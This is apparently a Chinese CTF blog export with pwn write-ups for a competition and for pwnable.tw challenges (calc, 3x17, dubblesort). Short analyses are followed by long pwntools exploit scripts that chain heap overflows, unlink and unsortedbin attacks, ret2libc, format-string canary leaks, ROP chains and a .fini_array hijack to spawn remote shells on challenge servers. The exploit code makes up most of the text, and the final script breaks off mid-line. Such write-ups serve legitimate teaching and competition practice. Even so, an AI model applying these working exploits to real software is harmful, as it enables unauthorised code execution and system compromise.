    <content type="text"><![CDATA[发现太久没有写博客了，就放一下刚打完的被喷得怪可怜的第5**空间的一点wp吧。 立雪edit 函数没有对size进行检测，所以可以任意长度的堆溢出 ​ 而且程序存在后门函数，unlink到0x602088修改为0xffff即可(其实最快速的做法是unsortedbin attack到0x602088) exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *\# context.log_level = 'debug'\# p = process('./pwn15')p = remote("111.33.164.4","50015")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def new(l,data):​ ru("choice:")​ sl('1')​ ru("note:")​ sl(str(l))​ ru("note:")​ sl(data)def delete(id):​ ru("choice:")​ sl('3')​ ru("Index:")​ sl(str(id))def edit(id,l,data):​ ru("choice:")​ sl('2')​ ru("Index:")​ sl(str(id))​ ru("note:")​ sl(str(l))​ ru("note:")​ sl(data)ptr = 0x6020C0fd = ptr - 8*3bk = ptr - 8*2\# pay = 0x18*'a' + p64(0xffffffffffffffff)\# edit(0,0x28,pay)new(0x20,'b')new(0xa0,'c')new(0x20,'a')pay = p64(0) + p64(0x20) + p64(fd) + p64(bk) + p64(0x20) + p64(0xb0)edit(0,0x30,pay)delete(1)pay = p64(0)*3 + p64(0x602088)edit(0,0x40,pay)edit(0,8,p32(0xffff))ru("choice:")sl('2019')\# gdb.attach(p)p.interactive() 拈花 分析函数可以知道有明显的栈溢出漏洞，直接ret2libc攻击，先puts出puts_got的真实地址然后再跳一次，回到main，再执行system函数直接getshell： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./pwn11')if local:​ p = process('./pwn11')​ libc = elf.libcelse:​ p = remote('111.33.164.4',50011)​ libc = ELF('./libc.so.6')sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive() def bk(addr):​ gdb.attach(p,"b *"+str(hex(addr))) ru("please input your name")sl('king')ru("Let's start a game,can you guess the key?")pop_rdi_ret = 0x00000000004012abputs_got = elf.got["puts"]puts_plt = elf.symbols["puts"]py = ''py += 'a'*0x20py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(puts_got)py += p64(puts_plt)py += p64(0x401162)sl(py)ru("fail!\n")puts_addr = u64(rc(6).ljust(8,'\x00'))print "puts--&gt;" + hex(puts_addr)system = puts_addr - libc.symbols["puts"] + libc.symbols["system"]binsh = puts_addr - libc.symbols["puts"] + libc.search('/bin/sh\x00').next()py = ''py += 'a'*0x20py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(binsh)py += p64(system)ru("please input your name")sl('king')ru("Let's start a game,can you guess the key?")sl(py)p.interactive() 於讴​ ​ 这里输入小于0x3E7的值就可以进去一波函数，但是没什么用，虽然不知道那里是什么(直接没理会)，输入大小大于0x3E7，直接退出回到main，然后直接有个栈溢出漏洞（sub_4007E2），那么和拈花一样，直接先puts出真实地址然后回跳到main，再执行system函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./pwn6')if local:​ p = process('./pwn6')​ libc = elf.libcelse:​ p = remote('111.33.164.4', 50006)​ libc = ELF('./libc-2.19.so')sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive() def debug(addr,PIE=True):​ if PIE:​ text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)​ gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))​ else:​ gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) def bk(addr):​ gdb.attach(p,"b *"+str(hex(addr))) sl('10000')ru("OH, WHY ARE YOU SO GOOD?")pop_rdi_ret = 0x0414fc3puts_got = elf.got["puts"]puts_plt = elf.symbols["puts"]py = ''py += 'a'*0x10py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(puts_got)py += p64(puts_plt)py += p64(0x400793)sl(py)rc(1)puts_addr = u64(rc(6).ljust(8,'\x00'))print "puts--&gt;" + hex(puts_addr)system = puts_addr - libc.symbols["puts"] + libc.symbols["system"]binsh = puts_addr - libc.symbols["puts"] + libc.search('/bin/sh\x00').next()py = ''py += 'a'*0x10py += 'aaaaaaaa'py += p64(pop_rdi_ret)py += p64(binsh)py += p64(system)sl('10000')ru("OH, WHY ARE YOU SO GOOD?")sl(py)p.interactive() 副墨​ 这题有点意思，首先覆盖seed为0，写C脚本跑伪随机数： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;\#include &lt;string.h&gt;int main()&#123;​ int seed = 0;​ srand(seed);​ int v14=0;​ for(int i=0;i&lt;=9;i++)​ &#123;​ v14 = rand() % 0x1869Fu + 1;​ printf("%d\n",v14);​ &#125;&#125; 跑出随机数：a = [7427,39356,9595,54062,67371,42578,92585,76990,22615,53318] 第一次写入栈中的数据大小(0x2A)，这里seed的偏移为0x1c，所以可以覆盖为0： 1234567py = ''py += "-%17$p-%23$p-"py = py.ljust(0x1c,'a')py += p64(0) 因为有格式化字符串漏洞，所以可以直接打印出canary和base基地址，然后就可以先puts出真实地址，然后回跳一次main，再执行system，思路和前面的差不多（这里onegadget用不了） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163#coding=utf8from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')local = 0elf = ELF('./bf')if local:​ p = process('./bf')​ libc = elf.libcelse:​ p = remote('111.33.164.4',50001)​ libc = ELF('./libc-2.19.so') sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)ru = lambda s : p.recvuntil(s)ti = lambda : p.interactive() def debug(addr,PIE=True):​ if PIE:​ text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)​ gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))​ else:​ gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) a = [7427,39356,9595,54062,67371,42578,92585,76990,22615,53318]ru("Are you sure want to play the game?")sl('1')ru("Input your name : ")py = ''py += "-%17$p-%23$p-"py = py.ljust(0x1c,'a')py += p64(0)sl(py)for i in range(10):​ ru('Now guess:')​ sl(str(a[i]))ru("-")canary = int(ru("-")[:-1],16)print "canary---&gt;" + hex(canary)addr = int(rc(14),16)addr = addr&amp;0xfffffffff000print "addr---&gt;" + hex(addr)puts_got = elf.got["puts"] + addrmain = addr + 0xABFputs_plt = elf.symbols["puts"] + addrpop_rdi_ret = 0x0db3 + addr\#onegadget = addr - libc.symbols["__libc_start_main"] + libc.symbols["system"]py = ''py += 'a'*0x34py += p64(canary)py += 'bbbbbbbb'py += p64(pop_rdi_ret)py += p64(puts_got)py += p64(puts_plt)py += p64(main)sl(py)puts_aa = u64(ru("Are")[2:-4].ljust(8,'\x00'))print "puts_aa----&gt;" + hex(puts_aa)system = puts_aa - libc.symbols["puts"] + libc.symbols["system"]binsh = puts_aa - libc.symbols["puts"] + libc.search("/bin/sh\x00").next()ru("to play the game?")sl('1')ru("Input your name : ")py = ''py += "-%17$p-%18$p-"py = py.ljust(0x1c,'a')py += p64(0)sl(py)for i in range(10):​ ru('Now guess:')​ sl(str(a[i]))py = ''py += 'a'*0x34py += p64(canary)py += 'bbbbbbbb'py += p64(pop_rdi_ret)py += p64(binsh)py += p64(system)sl(py)p.interactive() 正定跟立雪基本一样，做立雪的时候傻逼了用了麻烦的unlink，其实可以直接unsortedbin attack exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *\# context.log_level = 'debug'\# p = process('./pwn14')p = remote("111.33.164.4","50014")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def new(l,data):​ ru("choice : ")​ sl('1')​ ru("note : ")​ sl(str(l))​ ru("note:")​ sl(data)def delete(id):​ ru("choice : ")​ sl('3')​ ru("Index :")​ sl(str(id))def edit(id,l,data):​ ru("choice : ")​ sl('2')​ ru("Index :")​ sl(str(id))​ ru("note : ")​ sl(str(l))​ ru("note : ")​ sl(data)new(8,'n')new(0xa0,'a')new(8,'b')delete(1)pay = p64(0)*3 + p64(0xb1) + p64(0) + p64(0x4040A0 - 0x10)edit(0,0x40,pay)new(0xa0,'c')ru("choice : ")sl('70')\# gdb.attach(p)p.interactive() 一苇这题也存在后门 也存在栈溢出，先自用buf没有初始化打印出代码段地址绕过PIE，之后栈溢出跳转到后门 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#coding:utf-8from pwn import *context.log_level = 'debug'\#内存地址随机化def debug(addr,PIE=True):​ if PIE:​ text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16)​ print "breakpoint_addr --&gt; " + hex(text_base + 0x202040)​ gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))​ else:​ gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) \# p = process('./pwn13')p = remote("111.33.164.4","50013")p.recvuntil("choice:")p.sendline('1')p.recvuntil("massage\n")\# p.sendline('a'*0x28 + '\x50')p.send('a'*9)p.recvuntil('a'*8)text_addr = u64(p.recv(6).ljust(8,'\x00')) - 0x61text_addr = text_addr &amp; 0xfffffffff000log.info("text_addr --&gt; %s",hex(text_addr))p.recvuntil("choice:")p.sendline('1')p.recvuntil("massage\n")\# debug(0xa2c)p.sendline('a'*0x28 + p64(text_addr + 0xa50))p.interactive() 坐忘存在栈溢出，但是开启了canary ，先将canary的低位’\x00’覆盖泄漏出canary 之后就快乐溢出了，因为程序是静态编译所以ropchain一把梭，但是程序写了个base64解密，所以所有的输入都要经过base64加密 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201from pwn import *from struct import pack\# Padding goes hereimport base64context.log_level = 'debug'\# io = process('./pwn9')io = remote("111.33.164.4","50009")io.recvuntil("&gt;\n") s = base64.b64encode('n0van0va1')io.sendline(s)io.recvuntil('n0van0va')canary = u64(io.recv(8)) - 0x31log.info("canary --&gt; %s",hex(canary))io.recvuntil("continue ?")io.sendline("yes")p = ''p += pack('&lt;Q', 0x0000000000401f57) # pop rsi ; retp += pack('&lt;Q', 0x00000000006cb080) # @ .datap += pack('&lt;Q', 0x00000000004715e4) # pop rax ; retp += '/bin//sh'p += pack('&lt;Q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp += pack('&lt;Q', 0x0000000000401f57) # pop rsi ; retp += pack('&lt;Q', 0x00000000006cb088) # @ .data + 8p += pack('&lt;Q', 0x0000000000426baf) # xor rax, rax ; retp += pack('&lt;Q', 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp += pack('&lt;Q', 0x0000000000401e36) # pop rdi ; retp += pack('&lt;Q', 0x00000000006cb080) # @ .datap += pack('&lt;Q', 0x0000000000401f57) # pop rsi ; retp += pack('&lt;Q', 0x00000000006cb088) # @ .data + 8p += pack('&lt;Q', 0x00000000004433e6) # pop rdx ; retp += pack('&lt;Q', 0x00000000006cb088) # @ .data + 8p += pack('&lt;Q', 0x0000000000426baf) # xor rax, rax ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046f140) # add rax, 1 ; retp += pack('&lt;Q', 0x000000000046fea5) # syscall ; retio.recvuntil("&gt;\n")pay = 'a'*8 + p64(canary) + p64(0) + ppayload = base64.b64encode(pay)\# gdb.attach(io,"b *0x401183")io.sendline(payload)io.recvuntil("continue ?")io.sendline("no")io.interactive() 玄冥同样edit函数没有检测size大小，所以有任意大小的堆溢出，而且程序使用malloc申请堆块可以泄漏出main_arena ，之后 利用堆溢出伪造堆块将malloc_hook填写为system_addr 再调用malloc(binsh_addr)get shell exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157from pwn import *context.log_level = 'debug'\# p = process('./pwn')local = 0if local:​ libc = elf.libcelse:​ p = remote("111.33.164.4","50007")​ elf = ELF('./pwn')​ libc = ELF('./libc6.so')​ print "remote"​ pause() sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(size):​ ru("&gt;&gt;")​ sl('1')​ ru("size:")​ sl(str(size))def show(id):​ ru("&gt;&gt;")​ sl('2')​ ru("id:")​ sl(str(id))def edit(id,size,data):​ ru("&gt;&gt;")​ sl('3')​ ru("id:")​ sl(str(id))​ ru("size:")​ sl(str(size))​ ru("content:")​ sl(str(data))def delete(id):​ ru("&gt;&gt;")​ sl('4')​ ru("id:")​ sl(str(id))note_list = 0x6020E0add(0x80)#0add(0x10)#1delete(0)add(0x80)#0show(0)ru("data:")main_arena = u64(rc(6).ljust(8,'\x00')) - 88\# libc_base = main_arena - 0x3c4b20log.info("main_arena --&gt; %s",hex(main_arena))\# log.info("libc_base --&gt; %s",hex(libc_base))one = [0x41320,0x41374,0xd6e77]\# onegadget = libc_base + one[2]\# log.info("onegadget --&gt; %s",hex(onegadget))add(0x60)#2delete(2)pay = p64(0)*3 + p64(0x71) + p64(main_arena-0x33)*2edit(1,100,pay)add(0x60)#2add(0x60)#3pay = 0x13*'a' + p64(elf.plt['puts'])edit(3,0x30,pay)add(6299680)puts_addr = u64(rc(6).ljust(8,'\x00'))log.info("puts_addr --&gt; %s",hex(puts_addr))libc_base = puts_addr - libc.symbols['puts']onegadget = libc_base + one[1]system = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()log.info("libc_base --&gt; %s",hex(libc_base))log.info("onegadget --&gt; %s",hex(onegadget))log.info("system --&gt; %s",hex(system))log.info("binsh_addr --&gt; %s",hex(binsh_addr))\# gdb.attach(p)pay = 0x13*'a' + p64(system)edit(3,0x30,pay)add(binsh_addr)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw系列]]></title>
    <url>%2F2019%2F07%2F03%2Fpwnable.tw%2F</url>
    <content type="text"><![CDATA[calc不愧是pwnable，质量果然高，学到了不少姿势，看题目很明显程序是一个计算器，但漏洞点在哪，着实让我这个小菜鸡绞尽脑汁，起初试图独自解决，最后还是迫于现实膜一了波大佬的write up 。 程序分析保护 开启了canary 跟NX 主函数calc get_expr用来存放计算公式的，init_pool是一个初始化函数，将v1数组初始化为0，bzero(&amp;s,0x400) == memset(s,0,0x400)，parse_expr函数便是这个程序的关键，用来计算结果的。 分析parse_expr函数该函数主要分为两个步骤：解析运算表达式、计算运算结果 。 该函数两个参数，参数1为用户输入的运算表达式的地址，参数2为init_pool函数初始化的v1数组（下文命名为initpool） 函数分配了100字节的空间给一个数组operator[100]，用来保存所有的操作符，其实函数的漏洞就在这个运算过程中，所以我们要先很清楚地熟悉parse_expr函数的运算过程。 首先，函数进入一个大循环，对运算表达式的每一个字符分析处理，判断条件：当前字符的ASCII码值-48如果 大于9，则将其识别为运算符；反之识别为数字处理。这时候大家可能会有两个疑问：1、ASCII码小于48的字符可不止运算符，大于48的也不止数字呀 ；2、“+，-，x，/，%”这几个运算符可都比48小，-48就是负数了，也肯定小于9啊。第一，早在get_expr函数输入运算式的时候就已经限定了输入的字符只能是数字和”+-*/%” 第二、”+-*/%”的ASCII虽然小于48，但是程序定义的差值是无符号整形(unsigned int)，所以作为一个无符号的数，小于48减去48是远远大于9的。 继续往下讲，如果当前字符为数字，那么循环中什么也不做，i++继续往下遍历，如果当前字符为运算符，函数要做的第一件事是将前面的字符转化为整数保存起来，保存在哪呢？就保存在initpool数组中 从逻辑来看操作数是从initpool[1]的位置开始保存的，那么问题来了initpool[0]用来干嘛呢，从count=(*initpool)++这一句来看initpool[0]保存的应该是当前运算数的个数，(正常下固定为2，因为一个操作符两个操作数)，由此可见，程序两个最重要的数据结构为initpool[]和operator[]，一个存操作数一个存操作符。 接下来为了保证输入的表达式是合法的，函数对当前操作符的下一个字符进行了判断若后一个字符也是操作符的话，则视当前表达式非法，退出此次运算。 接下来就是parse_expr的关键部分了，运算。 当处理到操作符是，判断是否为第一个操作符，是的话进入else，将当前操作符保存在operator[v7]中，也就是operator[0]，如果不是第一个操作符的话进入if条件。if的作用：保存当前操作符至operator数组中，并进行之前操作符所对应的运算，举个例子： 11+3-2 当处理到”+”时，由于这是第一个运算符，函数只是将其左值 “1” 保存至initpool[1]中，并将 “+” 保存至operator[0]中，然后继续循环。当处理到 “-“ 时，因为inipool中已经有两个值”1”和”3”，而且operator中也保存了一个值 “+” ，也就是说，此时两个数组中的情况为： 12initpool[0]=2,initpool[1]=1,initpool[2]=3operator[0]=&quot;+&quot; 将1和3进行加法运算并保存起来，这就是eval函数做的事 eval函数 eval函数将”1+3”的计算结果”4”保存在之前”1”的位置，也就是initpool[initpool[0]-1]=initpool[1]中，（注意，这里的保存位置iniptool[1]是由initpool[0]相对确定的），这样一来，情况就是这样的： 12initpool[0]=2,initpool[1]=4,initpool[2]=2operator[0]=&quot;+&quot;,operator[1]=&quot;-&quot; 函数接下来就会通过eval计算”4-2”，并将运算结果仍然保存在initpool[1]中。程序经过多次运算，最终会将计算结果输出给用户： 上图中，ebp+var_5A0为initpool[0]的位置，ebp+var_59C为initpool[1]的位置，因此，（注意）程序输入给用户的结果为： 1initpool[1+initpool[0]-1] = initpool[initpool[0]] 至此，程序的逻辑算是勉勉强强弄懂了，那么，漏洞在哪 呢？ 漏洞分析其实我不看writeup 过了一遍又遍的程序还是没能找到漏洞，漏洞就出现在上文提到注意的地方。 虽然eval函数看似每次都将算运结果放到了initpool[1]中去，但是实际上这个下标”1”是由initpool[0]-1得到的，上文也提到正常情况下initpool[0]固定等于2的，因此我们总能将计算结果放到initpool[1]中去，并且最终将结果输出给用户。如果 我们能控制initpool[0]的值呢？这样我们相当于能实现任意地址读写了。 我们回头去看一下initpool[0]的值是怎么确定的， 这一串代码的意思就是：若运算符左边的操作数存在，那么就将操作数放到initpool[initpool[0]+1]上并且initpool[0]++，所以，如果左边的操作数不存在呢，那么initpool[0]就不会+1，当解析到下一个操作符时，initpool[0]才加一，那么进入eval函数计算时就是这样的： 123比如输入+300的情况如下 initpool[0]=1,initpool[1]=300operator[0]=&quot;+&quot; 最终的计算结果会放到initpool[initpool[0]-1] == initpool[0]，也就是initpool[0]=301这样，通过畸形的运算式我们就能控制initpool[0]的值了，接下来只需要计算好返回地址跟initpool[0]的偏移就可以进行地址的读写了 接下来就是构造ROP链执行execve(&quot;/bin/sh&quot;,0,0)因为这里需要用到是的参数”/bin/sh”的地址，我的做法是泄漏出栈地址，往栈中写入”/bin/sh”，然后将”/bin/sh”的地址做为参数。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# initpool -&gt; 0xffffc818 1(a)# 0xffffc81c result == 0xffffc81c + 4*(a-1)# 0xffffc820 count# 0xffffc824 #coding:utf-8from pwn import *# p = process('./calc')p = remote("chall.pwnable.tw","10100")context.log_level = 'debug'pop_eax = 0x0805c34b# pop_ebx = 0x080481d1pop_ecx_ebx = 0x080701d1pop_edx = 0x080701aaint_0x80 = 0x08049a21def exp(data): if data&gt;0: payload = '+' + str(data) else: payload = '-' + str(-data) return payloadp.recvuntil("=== Welcome to SECPROG calculator ===\n")# +361 :ret_addr# gdb.attach(p,"b *0x80493F2")# 0x8048F45 +# 0x8048F79 -p.sendline('+360')stack_addr = 0xffffffff + int(p.recvuntil('\n')[:-1],10) + 1print "stack_addr --&gt; " + hex(stack_addr)binsh_addr = stack_addr + 4print "binsh_addr --&gt; " + hex(binsh_addr)#pop_eax 11p.sendline('+361')data = pop_eax - int(p.recvuntil('\n')[:-1],10)p.sendline('+361' + exp(data))p.recv()p.sendline('+362')data = 11 - int(p.recvuntil('\n')[:-1],10)p.sendline('+362' + exp(data))p.recv()#pop_ecx_ebx 0,binsh_addrp.sendline('+363')data = pop_ecx_ebx - int(p.recvuntil('\n')[:-1],10)p.sendline('+363' + exp(data))p.recv()p.sendline('+364')data = 0 - int(p.recvuntil('\n')[:-1],10)p.sendline('+364' + exp(data))p.recv()p.sendline('+365')data = int(p.recvuntil('\n')[:-1],10)payload = 0xffffffff - binsh_addr + data + 1p.sendline('+365-' + str(payload))p.recv()#pop edx 0p.sendline('+366')data = pop_edx - int(p.recvuntil('\n')[:-1],10)p.sendline('+366' + exp(data))p.recv()p.sendline('+367')data = 0 - int(p.recvuntil('\n')[:-1],10)p.sendline('+367' + exp(data))p.recv()#int_0x80p.sendline('+368')data = int_0x80 - int(p.recvuntil('\n')[:-1],10)p.sendline('+368' + exp(data))p.recv()#/bin/sh\x00p.sendline('+369')data = 0x6e69622f - int(p.recvuntil('\n')[:-1],10)p.sendline('+369' + exp(data))p.recv()p.sendline('+370')data = 0x0068732f - int(p.recvuntil('\n')[:-1],10)p.sendline('+370' + exp(data))p.recv()p.interactive() 参考博客：https://www.tuicool.com/articles/VNzqea3 写得太好太详细了吧！ 3x17这也是一道很神奇的题，很巧妙，很佩服。 程序分析 程序很简单，任意地址写，且只能写一次，一开始看到这里我很开心，这不是送分嘛！但是……….但是，，一次的任意地址写，有啥用？我开始懵了，看了writeup 才发现触及到了我的知识盲区 程序在这时设置了参数byte_4b9330每次都加1 即使能够调用回到main函数也无法再次使用任意地址写这个功能。 漏洞分析很明显了就是任意地址写了，但是要怎么去用它呢。这里涉及到了一个新知识（对于我来说）有一个新东西叫做.fini_array,是程序执行完毕之势执行的函数，这个数组里存着两个函数地址，这个数组 的两个函数以倒序依次被 执行，我们可以通修改.fini_array的内容来控制程序的执行流，根据这个数组调用，可以找到实际调用函数的位置，（IDA中shift +F7 可查看所以段，可以快速找到.fini_array段） gdb下个断看一下这里的调用是干嘛的 可以看到rbp为0x4b40f0即.fini_array也就是arr[1]，继续调试，可以看到rbx变为0之后跟-1比较cmp不相等，因此次调用执行call[rbp+rbx*8+0],即调试arr[0]，刚好符合我们查到的：倒序调用，所以我们现在要做的就是修改.fini_array数组构造一个无循环疯狂加调main函数，这样参数byte_4b9330就会疯狂加1 ，最终会回到0(0xff + 1 -&gt; 0)，这样我们就可以再次用到任意地址写这个功能。 我的做法是将arr[1]改为main，arr[0]改为调用.fini_array的函数也就是0x402960，这样的效果就是，调用arr[1]进入了main函数，出来调用了arr[0]又过来调用arr[1]进入main函数，然后继续调用arr[0]来调用main………疯狂调用main。这样就能实现多次的任意地址写了，接下来就构造ROP链，实现系统调用execve(&#39;/bin/sh&#39;,0,0)。 要让这个循环停下来只需要在ROP链构造完成后让arr[0]为leave_ret_addr即可。 exp123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'debug'# p = process('./3x17')p = remote("chall.pwnable.tw","10105")def write(addr,value): p.recvuntil(':') p.sendline(str(addr)) p.recvuntil(':') p.send(str(value))fini_array = 0x4b40f0main = 0x401b6dloop_call = 0x402960pop_rax = 0x41e4afleave_ret = 0x401c4bbinsh_addr = 0x4B9300pop_rdi = 0x401696pop_rdx = 0x446e35pop_rsi = 0x406c30syscall = 0x471db5# execve = 0x3b# rdi,rsi,rdx# write(binsh_addr, p64(0x68732f6e69622f))# pop_rdi binsh_addr# pop_rsi 0# pop_rdx 0# pop_rax 0x3b# syscallwrite(fini_array,p64(loop_call) + p64(main))# write(binsh_addr, p64(0x68732f6e69622f))write(binsh_addr,'/bin/sh\x00')write(fini_array + 0x10,p64(pop_rdi) + p64(binsh_addr))write(fini_array + 0x20,p64(pop_rsi) + p64(0))write(fini_array + 0x30,p64(pop_rdx) + p64(0))write(fini_array + 0x40,p64(pop_rax) + p64(0x3b))write(fini_array + 0x50,p64(syscall))# gdb.attach(p,"b *0x401c4b")write(fini_array,p64(leave_ret))p.interactive() 参考博客：https://ama2in9.top/2019/04/10/3x17/ dubblesort这题也很妙，程序保护全开，主要功能是实现一个冒泡排序 程序一开始会让你输入name，然后输出，但是因为buf没有初始化导致这里可以泄漏出地址，真实地址很容易就拿到了，但是怎么利用？接下来输入num进行排序。 这里v9并没有限制大小，所以可以输入无数多个数字，溢出很明显了，但是因为程序开启了canary，所以单纯的覆盖到ret并不可行。 通过测试发现单输入 +和-并不会覆盖栈上的值，所以可以通过在canary 位置输入+来绕过canary。接下来是sort的问题了，因为程序是将我们输入到栈上的数字进行排序再按从小到大的顺序写回到栈中去的，所以应该这样构造栈内容： 这样一来通过排序才不会打乱我们的栈布局，同时也刚好真实地址binsh_addr &gt; system_addr exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./dubblesort') elf = ELF('./dubblesort') libc = elf.libcelse: p = remote("chall.pwnable.tw","10101") elf = ELF('./dubblesort') libc = ELF('./libc_32.so.6')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print 